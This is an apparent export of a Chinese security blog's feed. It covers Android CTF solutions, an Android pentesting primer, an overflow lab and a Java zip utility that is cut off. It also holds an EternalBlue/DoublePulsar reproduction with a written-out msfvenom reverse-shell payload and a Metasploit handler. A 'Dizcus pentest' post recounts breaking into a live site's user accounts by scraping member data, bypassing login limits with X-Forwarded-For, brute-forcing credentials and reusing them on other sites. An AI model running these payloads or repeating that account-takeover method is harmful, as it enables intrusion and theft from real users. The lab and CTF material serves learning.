    <content type="text"><![CDATA[概述为了让初学者能够更好的学习基于android的渗透测试，CodeEngn开发了很多的android app供大伙学习。 SmartApp AnalysisSmartApp 01题目地址SmartApp 01 解题步骤发现程序不能直接安装到手机上。 解压APK文件后发现有三个文件的文件名是错误的且缺少META-INF文件，所以不能正常安装到手机，如下图所示： 修改错误的文件名后，进行zip压缩，并修改后缀为apk，然后进行签名： 12$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore releasekey.keystore C:\Users\dell\Desktop\app-test\SmartApp-L01.apk keyalias 签名成功后安装到移动设备上，打开启动app就可以看到Key：H3ll0 C0de3ngn。 SmartApp 02题目地址SmartApp 02 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 于是反编译了下源代码，发现key的值被加密了，而且作了限制，只有条件成立，才能解密： 于是修改smali代码： 重新编译下程序，然后再进行一次签名，然后安装到手机上，key就出来了： The Key is November Rain。 SmartApp 03题目地址SmartApp 03 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 用androidlyze.py分析了下代码： 123$ a, d, dx=AnalyzeAPK('Desktop/SmartAppL03.apk', decompiler="dad")$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity.source()$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity_1.source() 看了代码之后，发现模拟器界面没有显示全，少了几个按钮，而且看到了判断的条件： 首先修改判定条件，如下图： 然后进行签名。既然模拟器运行不全，应该是android的版本有问题，换到手机试下： SmartApp 04题目地址SmartApp 04 解题步骤直接反编译一下，发现这里有个条件判断，输入key后才能显示答案正确： 先看下dex的字符串： 找到了一个比较可疑的地方，这里有一个helloWorldD函数，而直接还原成java代码，并不能找到： 通过010编辑器查看确实有一个helloWorldD函数，应该是被隐藏掉了： 找到原先的helloWorldC函数，它后面应该是helloWorldD函数，记下地址：0x0cd0 找到如下图所示的地方，根据前几个函数相应的规则，修改： 用androidlyze.py分析了下代码： 12$ d,dx = AnalyzeDex("Desktop/classes.dex",decompiler="dad")$ d.CLASS_Lcom_namdaehyeon_zfinekey4_zFindKey.source() 可以看到就是每个位置和 240(0xf0) 异或了下： 解出来就是： The Key is BoanprojectZZang #总结]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android 渗透测试基础入门]]></title>
    <url>%2F2017%2F06%2F22%2Fandroid-base%2F</url>
    <content type="text"><![CDATA[概述自从毕业了之后就少了很多杂七杂八的事，可以好好的学习下Android以及Android渗透测试。 基本结构AndroidAndroid 架构Android 是基于 Linux 平台的操作系统。Android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，Android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和Linux内核层。 Android使用Dalvik虚拟机的概念，可以高效的运行多个虚拟机。Android操作系统使用这些虚拟机将各个应用程序运行为自己的进程。 安装的应用程序会因各种目的保存到如下目录： 123456/system/app/应用名.apk // 保存系统应用程序/data/app/应用名.apk // 保存已注册的用户应用程序/data/app/应用名-1.apk // 保存用户下载的应用程序/mnt/secure/asec/应用名-1.asec // 保存移动到SD卡的应用程序/data/data/应用名 // 保存应用程序的重要信息/mnt/sdcard // 保存应用程序的一般信息 其中/data/data/应用名保存的信息最为重要： 123456/data/data/应用名├─files // 保存内部使用的文件（so、data、ini文件等）├─lib // 保存应用程序请求的库文件（存在so文件）├─databases // 保存设置文件、内容文件等的查询信息的SQLite数据库文件（存在db文件）├─cache // 有读写权限，包括浏览器缓存和用户临时状态信息└─shared_prefs // 保存为XML文件，是应用程序共享的设置文件 其中 shared_prefs 目录内的preferences.xml文件包含应用程序的设置文件。因为包括升级、版本信息等内容，所以恶意访问时，此处会包含API密钥的盗用、认证密钥值等信息。 Android 重要组件以及生命周期Android 由Activity，Service（服务）,Content Provider（内容提供者），BroadCastReceiver（广播接收器）四大基本组件组成。 ActivityAndroid 应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity的生命周期如下图所示： 途中涉及到的各类方法： ServiceService 不会显示给用户，其运行过程与Activity相似。听音乐或者录音都在后台运行，与其他软件的运行是同时的，这些都属于Service的功能。 Activity与Service都以名为UI线程的相同应用线程执行。 Content ProviderContent Provider 是应用程序之间共享数据的界面。Android的每个应用程序都默认在Sandbox中运行，所以与系统中的其他应用程序相互分隔，不能直接访问数据。Content Provider遵守CURD（Create、Update、Read、Delete）原则。应用程序通过Inter共享小数据。Content Provider 适合共享音乐文件、图片文件等大容量文件。 BroadCastReceiver你的应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager 来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。 四大组件的注册四大基本组件都需要注册才能使用，每个Activity、service、Content Provider内容提供者都需要在AndroidManifest文件中进行配置，AndroidManifest文件中未进行声明的activity、服务以及内容提供者将不为系统所见，从而也就不可用，而BroadcastReceive广播接收者的注册分静态注册（在AndroidManifest文件中进行配置）和通过代码动态创建并以调用Context.registerReceiver()的方式注册至系统。需要注意的是在AndroidManifest文件中进行配置的广播接收者会随系统的启动而一直处于活跃状态,只要接收到感兴趣的广播就会触发（即使程序未运行）。 AndroidManifest文件中进行注册格式如下：1234&lt;activity&gt; 元素的name 属性指定了实现了这个activity 的Activity 的子类。icon 和label 属性指向了包含展示给用户的此activity 的图标和标签的资源文件。&lt;service&gt; 元素用于声明服务&lt;receiver&gt; 元素用于声明广播接收器&lt;provider&gt; 元素用于声明内容提供者 APKAPK 文件其实是一个 Zip 的压缩包，解压了此文件可以看到如下目录： 12345678910APK├─META-INF // 主要存放证书，没有证书无法安装程序 │ ├─CERT.RSA // 公钥证书│ ├─CERT.SF // 包含APP的所用资源，负责对APP进行签名│ └─MANIFEST.MF // 声明了资源，与CERT.SF相似├─res // 存放资源文件的目录├─lib // 如果存在的话，存放的是 ndk 编出来的 so 库├─resources.arsc // 编译后的二进制资源文件├─classes.dex // 最终生成的 dalvik 字节码└─AndroidManifest.xml // 程序全局配置文件 classes.dexDex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准java的.class文件，它体积小，运行效率高。 classes.dex 文件头的格式如下： androidManifest.xmlandroidManifest.xml 是每个Android程序中必须的文件，它位于整个项目的根目录。我们每天都在使用这个文件，往里面配置程序运行所必要的组件，权限，以及一些相关信息。 AndroidManifest.xml是Android应用的入口文件，它描述了package中暴露的组件（activities, services, 等等），他们各自的实现类，各种能被处理的数据和启动位置。 除了能声明程序中的Activities, ContentProviders, Services, 和Intent Receivers,还能指定permissions和instrumentation（安全控制和测试）。 常用工具ADBadb的全称为Android Debug Bridge，就是起到调试桥的作用。通过adb我们可以在Eclipse中方面通过DDMS来调试Android程序，说白了就是debug工具。adb的工作方式比较特殊，采用监听Socket TCP 5554等端口的方式让IDE和Qemu通讯，默认情况下adb会daemon相关的网络端口，所以当我们运行Eclipse时adb进程就会自动运行。 借助adb工具，可以管理设备或手机模拟器的状态。还可以进行很多手机操作，如安装软件、系统升级、运行shell命令等等。其实简而言说，adb就是连接Android手机与PC端的桥梁，可以让用户在电脑上对手机进行全面的操作 命令介绍123456789101112131415161718192021222324252627282930313233343536# 查看设备$ adb devices# 连接设备（夜神模拟器端口 62001）$ adb connect ip:port # 安装软件$ adb install [apk文件路径]# 卸载软件$ adb uninstall [软件名]$ adb uninstall -k [软件名] // 如果加 -k 参数,为卸载软件但是保留配置和缓存文件.# 进入设备或模拟器的shell$ adb shell# 运行单条命令$ adb shell [command]# 端口转发$ adb forward [PC] [设备]$ adb forward tcp:6100 tcp:7100 // PC上所有6100端口通信数据将被重定向到手机端7100端口server上$ adb forward tcp:6100 local:logd // PC上所有6100端口通信数据将被重定向到手机端UNIX类型socket上$ adb forward tcp:62002 jdwp:17304 //在本地62002端口被重定向到手机17304进程上# 从电脑上发送文件到设备$ adb push [本地路径] [远程路径]# 从设备上下载文件到电脑$ adb pull [远程路径] [本地路径]# 查看bug报告$ adb bugreport# 查看log$ adb logcat drozerDrozer原名mercury,是一款不错的Android APP安全评估工具。现在有社区版/专业版两个版本。 安装安装其实比较简单，这里不进行描述，只是记录下安装过程中遇到的问题以及解决方案。 一、修复连接时java路径找不到问题 解决方案： 1、创建如下文件并命名为：1.txt （如果为winXP，则可以直接命名为.drozer_config）2、写入内容如下几行内容：此处为java.exe文件的安装位置，具体情况具体处理。 123[executables]java =C:\rogram Files\Java\jdk1.7.0_40\bin\java.exejavac =C:\Program Files\Java\jdk1.7.0_04\bin\javac.exe 3、把此文件放入个人目录下文件夹： 12英文：C:\Users\&lt;youruser name&gt;\中文：C:\用户\&lt;你的用户名名称&gt;\ 4、通过cmd命令重命名此文件为：.drozer_config 1rename C:\Users\d00218136\1.txt .drozer_config 运行12$ adb connect 127.0.0.1:62001 // 连接设备$ adb forward tcp:31415 tcp:31415 // 开启端口转发 开启移动设备中的agent.apk 1$ drozer console connect 用法123# 列出设备中安装的包$ run app.package.list$ run app.package.list -f 【app名称】 // 搜索包 1234# 获取安装的包的信息$ run app.package.info$ run app.package.info -a com.zjhcsoft.android.eip // 列举指定包的信息$ run app.package.info -p android.permission.INTERNET // 根据权限来列举包 123# 列举设备上所有的activity$ run app.activity.info$ run app.activity.info -f 【包名】 搜索包的activity 1234567891011121314151617181920# 列举设备上所有的provider$ run app.provider.info# 列举设备上所有的service$ run app.service.info# 列举设备上所有的broadcast$ run app.broadcast.info# 查看某包的受攻击面$ run app.package.attacksurface com.zjhcsoft.android.eip# 运行activity$ run app.activity.info -a 【包】 $ run app.activity.start --action 【activity 设置的intent filter的action属性】 --category 【activity 设置的intent filter的category 属性】--component 【package 名字】 【component 属性】$ run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.android.browser com.android.browser.BrowserActivity# 根据指定的intent action和intent category来查看activity$ run app.activity.forintent --action 【intent action】 --category 【intent category】$ run app.activity.forintent --action android.intent.action.VIEW --category android.intent.category.DEFAULT 其他用法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455Dex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指$ run 令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准jav// a的.class文件，它体积小，运行效率高。$ run app.activity.forintent // Find activities that can handle the given intent $ run app.activity.info // Gets information about exported activities. $ run app.activity.start // Start an Activity $ run app.broadcast.info // Get information about broadcast receivers $ run app.broadcast.send // Send broadcast using an intent $ run app.broadcast.sniff // Register a broadcast receiver that can sniff particular intents $ run app.package.attacksurface // Get attack surface of package $ run app.package.backup // Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP) $ run app.package.debuggable // Find debuggable packages $ run app.package.info // Get information about installed packages $ run app.package.launchintent // Get launch intent of package $ run app.package.list // List Packages $ run app.package.manifest // Get AndroidManifest.xml of package $ run app.package.native // Find Native libraries embedded in the application. $ run app.package.shareduid // Look for packages with shared UIDs $ run app.provider.columns // List columns in content provider $ run app.provider.delete // Delete from a content provider $ run app.provider.download // Download a file from a content provider that supports files $ run app.provider.finduri // Find referenced content URIs in a package $ run app.provider.info // Get information about exported content providers $ run app.provider.insert // Insert into a Content Provider $ run app.provider.query // Query a content provider $ run app.provider.read // Read from a content provider that supports files $ run app.provider.update // Update a record in a content provider $ run app.service.info // Get information about exported services $ run app.service.send // Send a Message to a service, and display the reply $ run app.service.start // Start Service $ run app.service.stop // Stop Service $ run auxiliary.webcontentresolver // Start a web service interface to content providers. $ run exploit.jdwp.check // Open @jdwp-control and see which apps connect $ run exploit.pilfer.general.apnprovider // Reads APN content provider $ run exploit.pilfer.general.settingsprovider // Reads Settings content provider $ run information.datetime // Print Date/Time $ run information.deviceinfo // Get verbose device information $ run information.permissions // Get a list of all permissions used by packages on the device $ run scanner.activity.browsable // Get all BROWSABLE activities that can be invoked from the web browser $ run scanner.misc.native // Find native components included in packages $ run scanner.misc.readablefiles // Find world-readable files in the given folder $ run scanner.misc.secretcodes // Search for secret codes that can be used from the dialer $ run scanner.misc.sflagbinaries // Find suid/sgid binaries in the given folder (default is /system). $ run scanner.misc.writablefiles // Find world-writable files in the given folder $ run scanner.provider.finduris // Search for content providers that can be queried from our context. $ run scanner.provider.injection // Test content providers for SQL injection vulnerabilities. $ run scanner.provider.sqltables // Find tables accessible through SQL injection vulnerabilities. $ run scanner.provider.traversal // Test content providers for basic directory traversal vulnerabilities. $ run shell.exec // Execute a single Linux command. $ run shell.send // Send an ASH shell to a remote listener. $ run shell.start // Enter into an interactive Linux shell. $ run tools.file.download // Download a File $ run tools.file.md5sum // Get md5 Checksum of file $ run tools.file.size // Get size of file $ run tools.file.upload // Upload a File $ run tools.setup.busybox // Install Busybox. $ run tools.setup.minimalsu // Prepare 'minimal-su' binary installation on the device. androguardandroguard (Android guard) 是 Android 应用程序的逆向工程，提供恶意软件分析等等功能，androguard 主要由 Python 编写。 androguard 主要有以下功能： 1234567androrisk.py // 该模块用于分析apk危险级别androapkinfo.py // 该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息androaxml.py // 该模块用于展示apk androidmanifest.xmlandrogexf.py // 该模块生成函数调用图apkviewer.py // 该模块生成指令级别的调用图androlyze.py // 该模块为交互分析环境androdiff.py // 分析2个apk的不同之处,检测app是否遭到修改 androapkinfo.py该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息 1$ python androapkinfo.py -i app-release.apk androlyze.py该模块为交互分析环境 1$ python androlyze.py -i app-release.apk -x 123$ python androlyze.py -s$ a,d,dx = AnalyzeAPK("Desktop/app-release.apk")$ print a,d,dx 12$ d,dx = AnalyzeDex("Desktop/classes.dex")$ print d,dx 等等，可以使用tab键 androdd.py查看apk文件结构 按照指定格式显示androidapk的所有类和子方法的信息流 1$ python androdd.py -i app-release.apk -o out -f png androgexf.pyandrogexf.py 将方法信息之间的连接状态转换成gexf格式 1$ androgexf.py -i app-release.apk -o apk.gexf androdiff.pyandrodiff.py 分析2个apk的不同之处,检测app是否遭到修改 1$ python androdiff.py -i app-release1.apk app-release2.apk 工具集一、santoku 操作系统 santoku 实质是一款定制的 Ubuntu 12.04 系统镜像，类似于KALI，与其它Ubuntu系统相比，它具有如下特点： 1.集成了大量主流的Android程序分析工具，为分析人员节省分析环境配置所需的时间。2.集成移动设备取证工具。支持Android、IPhone 等移动设备的取证工作。3.集成渗透测试工具。4.集成网络数据分析工具。在分析 Android病毒、木马等程序时，这些工具特别有用。5.采用 LXDE 作为系统的桌面环境，界面与 Windows XP非常相似，符合中国人使用习惯。6.正处于beta 阶段，但整个项目显得很有活力，相信将来的更新和维护也会不错。 二、APKIDE APKIDE这是一个大佬们集成的一个APK的测试工具集，包含了常用的大部分工具，例如adb、apktool等。 基础操作签名前面介绍过，META-INF这个文件主要与签名、证书有关。 对APP进行签名一、删除apk中的META-INF文件夹，然后重新zip压缩成apk二、创建密钥存储器（已经有的可以跳过） 1$ keytool -genkey -v -keystore 【keystore名称】 -alias 【密钥别名】 -keyalg RSA -keysize 2048 -validity 【有效天数】 三、使用密钥存储器对app进行签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 签名成功后会重新出现META-INF文件夹 查看APP的签名解压APK文件，使用JDK的keytool来查看META-INF/CERT.RSA文件内容 1$ keytool -printcert -file 【证书】 验证APP的签名1$ jarsigner -verify -verbose 【apk存放路径】 查看AndroidManifest.xml文件1$ java -jar apktool.jar d -f s 【APK地址】 静态调试一、将apk文件转化为jar文件 1$ dex-jar.bat 【apk】 二、jd-gui.exe 可反编译jar文件 动态调试一、将apk转换成smali代码 1$ java -jar apktool.jar d 【APK地址】 -o out 二、修改AndroidManifest.xml中的Android:debuggable=”true” 三、在入口处添加waitForDebugger代码进行调试等待 这里说的入口处，就是程序启动的地方，就是我们一般的入口Activity，查找这个Activity的话，方法太多了，比如我们这里直接从上面得到的AndroidManifest.xml中找到，因为入口Activity的action和category是固定的。 找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：然后添加一行代码： 1invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V // 相当于java的 android.os.Debug.waitForDebugger(); 四、将smali 转换成apk 1$ java -jar apktool.jar b 【路径】 【目标路径】 五、重新签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 六、安装apk 1$ adb install 【apk】 七、android studio 导入此项目，需要配置gradle，可参考文章 路径一般为 home\.gradle\wrapper\dists\gradle-x.x-all\xxxxxxxxxxxxx\gradle-x.x 八、配置android studio调试配置，Run-&gt;Edit configurations，点击+号，新建remote类型调试器，设置Name， 修改端口号，可以选择被占用的任意端口，本次设置为62002 九、运行指定的Activity 1$ adb shell am start -D -n com.zjhcsoft.android.eip/.MainActivity 十、查找相应的apk进程 1$ adb shell ps | findstr eip 十一、设置端口转发 1$ adb forward tcp:62002 jdwp:17304 这条命令的含义可以认为是在本地62002端口与手机17304进程之间建立一条通道，当开始调试时，AS连接本地的8800端口，通过这条通道控制程序的运行 十二、设置断点 十三、调试 run-&gt;debug选择刚才新增的调试器，此时程序会断在设置的断点的行，调试器解密如下 渗透测试中注意的点废话不说，直接上图好了。 总结毕竟还只是刚入门，学的时间也不是很久，就先总结到这，之后在进行渗透测试方面的练习以及案例的补充。]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 Equation Group 0day Tools]]></title>
    <url>%2F2017%2F04%2F22%2Fequation-group-0day-2017%2F</url>
    <content type="text"><![CDATA[概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。 工具包安装 下载安装 python-2.6.6.msi ,pywin32-221.win32-py2.6.exe 。 下载解压 shadowbroker 。 在 shadowbroker 的 windows 目录下新建 listeningposts 目录。 工具包简介 swift 银行攻击的证据 oddjob 植入后门等相关文档 windows 包含了各种漏洞利用工具 最主要还是Windows目录，其包含了各种漏洞利用工具，在exploits中包含了丰富的漏洞利用工具，可影响windows多个平台。 Exploits包含了很多漏洞利用工具，经过大佬们的初步梳理，重点关注对win server有影响的几个工具。 Tools Service Port Describe Explodingcan IIS IIS漏洞利用工具，只对Windows 2003有影响 Eternalromance 139和445 MS17-010 SMB 和 NBT漏洞利用工具 Emphasismine 143 通过ICMP漏洞工具 Englishmansdentist SMTP(25) 通过SMTP漏洞工具 Erraticgopher RPC(445) 通过RPC漏洞工具 Eskimoroll 88 MS14-068 漏洞利用工具，通过kerberos入侵 Eclipsedwing SMB(445) MS08-67 漏洞利用工具 Educatedscholar SMB(445) MS09-050 漏洞利用工具 Emeraldthread 139和445 MS10-061 MB和 Netbios 漏洞利用工具 Zippybeer SMB(445) SMTP漏洞利用工具 Eternalsynergy SMB(445) MS17-010 SMB漏洞利用工具 Esteemaudit RDP(3389) RDP漏洞利用工具 FUZZBUNCH是一个类似 MSF的漏洞利用平台工具，python编写。 Specials Tools Service Port Describe ETERNALBLUE SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(MS17-010) ETERNALCHAMPION SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(CVE-2017-0146/0147) ETERNALBLUE实验环境攻击机1 win7 64 旗舰版 python-2.6.6.msi pywin32-221.win32-py2.6.exe shadowbroker IP : 192.168.111.155 攻击机2 kali 2016.2 IP : 192.168.111.144 靶机 win2008 IP : 192.168.111.158 systeminfo 信息如下： 复现过程初始化配置，创建一个攻击项目。 使用 ETERNALBLUE 模块。 使用 DoublePulsar 模块。 DoublePulsar是一个后门程序，用于在已感染的系统上注入和运行恶意代码。这是一种NSA用作监听使用的后门程序，如今在GitHub上得到免费发布后，任何人均可使用。其软件是在Windows XP到Server 2008 R2系统版本中的计算机上，通过使用EternalBlue Exploit的SMB文件共享服务端口启动旧版本下的远程执行代码RCE，随后进行程序的安装。也就是说，会受到攻击影响的计算机系统是存在漏洞的Windows版本，因为这给攻击者提供了其SMB端口。 这里要选择SMB和对应的目标操作系统位数下面的话是攻击的4个操作 选择RunDLL。 这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload 1$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.144 LPORT=5555 -f dll &gt; s.dll 把生成的s.dll传到攻击机1上去， 然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来 123456$ msfconsole msf &gt; use exploit/multi/handler msf &gt; set LHOST 192.168.111.144 msf &gt; set LPORT 5555 msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp msf &gt; exploit 然后操作fb.py ，加载s.dll。 kali 收到反弹的shell 。 总结当然，还有其他的攻击模块，下次继续更新。 为了平时的渗透测试的方便，我临时写了个检测的脚本（测试版）,供大家测试使用。 参考ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生方程式 0day ETERNALBLUE 复现过程]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>equation group</tag>
        <tag>code execution</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dizcus Pentest]]></title>
    <url>%2F2017%2F04%2F04%2Fdizcus-pentest%2F</url>
    <content type="text"><![CDATA[概述某次看大佬们聊天时聊到某个站，于是赶紧上去看看。 过程看看下这个站，并没找到什么能getshell的办法，好气啊。只能想想其他思路了。偶然发现可以查看其他人的个人资料以及交的会员费等详情。于是搞了个python脚本爬了下所有交了会员费的用户。 发现用户登录的地方没有验证码限制，但是有登陆错误次数限制。 可以确定这个网站用户登录的地方的登陆限制是通过IP和用户名一起的，意思是同一个ip或者同一个用户只能错误登陆5次，之后便锁定了。 IP可以用X-Forwarded-For绕过，但是用户名没办法。 既然这样的话，那就试下用户名和密码一样的吧，看看这样能不能得到一些信息。 由于之前爬下来的账户显示的是昵称，假如没有昵称就显示用户名，这里刚好可以利用这点进行BurpSuite爆破。 OK，发现还是得到了一些用户的信息，试了下，可以登录，发现还不少。 当然，登陆之后还能看到用户邮箱的一些信息，进行了一下社工，部分账号可以登录12306等网站。 后来发现这种方式可以针对大部分的dizcus进行利用。 总结技术还是有所欠缺，还是得继续学习。]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
        <tag>python</tag>
        <tag>dizcus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 溢出]]></title>
    <url>%2F2017%2F03%2F11%2Flinux-overflow%2F</url>
    <content type="text"><![CDATA[概述Linux下的溢出学习。 目标代码12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; const char pass[] = "IloveIS2013@ZJGSU"; /* Password */ void authorized()&#123; printf( "You have been authorized!\n" );&#125; void getInput()&#123; char buffer[20]; gets( buffer ); if ( strcmp( pass, buffer ) == 0 ) &#123; authorized(); &#125; else printf("Your password is wrong!\n");&#125; int main()&#123; getInput(); return(0);&#125; 代码很简单，用户输入一个密码，然后程序把它加密起来，并且和程序中存储的密码对比，如果成功了，就调用authorized()函数，就当这个authorized()函数是用来让用户在登录后干一些敏感操作的好了。 1gcc -ggdb -fno-stack-protector -z execstack overflow.c -lcrypt -o overflow 步骤 程序分配20字节的缓冲区，然后把用户输入存储到这个缓冲区里面，然后调用函数把它加密，再和程序里的密码对比。 我们编译的时候会被编译器提示gets()不安全，事实上也是，因为它并没有做任何边界检查，所以我们就用它来调用漏洞了。 我们用objdump来dump一下生成的机器码，看看这儿它做了什么objdump -d -M intel overflow 现在我们所有要做的就是把getInput的返回地址覆盖为0x0000000000400636，而且我们可以做到。我们可 以在shell里用printf把数据传给程序，你可以用\x来转意16进制数据，因为地址是倒着来的（注：小端），所以我们也倒着给它就好了。还有，我 们需要用0x00来终止我们的缓存，这样strcmp就不会在我们函数返回之前引起一个段错误。printf的结果如下： 我们可以知道authorized()函数事实上已经执行成功了。]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java Zip]]></title>
    <url>%2F2017%2F03%2F10%2Fjava-zip%2F</url>
    <content type="text"><![CDATA[概述由于最近毕业设计的需要，需要使用到Zip的解压、压缩功能，还要有能加密解密，所以去找了相关的Java zip的包，封装了下。 需要Java Zip 解压、压缩的功能，需要用到zip4j这个jar文件，当然，我使用maven直接下载的。 在pom.xml里直接添加如下代码就好了： 12345&lt;dependency&gt; &lt;groupId&gt;net.lingala.zip4j&lt;/groupId&gt; &lt;artifactId&gt;zip4j&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt; 代码好了，直接上代码：package com.orleven.tentacle.util;import java.io.File;import java.util.ArrayList;import java.util.List;import net.lingala.zip4j.core.ZipFile;import net.lingala.zip4j.exception.ZipException;import net.lingala.zip4j.model.FileHeader;import net.lingala.zip4j.model.ZipParameters;import net.lingala.zip4j.util.Zip4jConstants;/** * Zip 处理工具包 * 需要注意的是如果压缩包里已经存在要添加的文件，会陷入死循环，所以添加之前要先判断一下。 * @author orleven * @date 2017年3月8日 */public class ZipUtil &#123; /** * 添加文件夹到zip中 * @param inPath * @param outPath * @param password * @return */ public static boolean addFoldInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); ; if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFolder(inPath, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFileInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); File inFile = new File(inPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFile(inFile, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加多个文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFilesInZip(ArrayList&lt;File&gt; inFiles,String storagePath,String outPath,String password) &#123; try &#123; ArrayList filesToAdd = new ArrayList(); ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFiles(inFiles, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 从zip中删除文件 * @param inPath * @param outPath * @param password * @return */ public static boolean removeFileInZip(String inPath,String storagePath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =fileHeaderList.size() -1; i&gt;0 ; i--) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; System.out.println("Name: " + fileHeader.getFileName()); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 查看压缩包的文件列表 * @param inPath * @param password * @return */ public static boolean getNameFromZip(String inPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); for (int i = 0; i &lt; 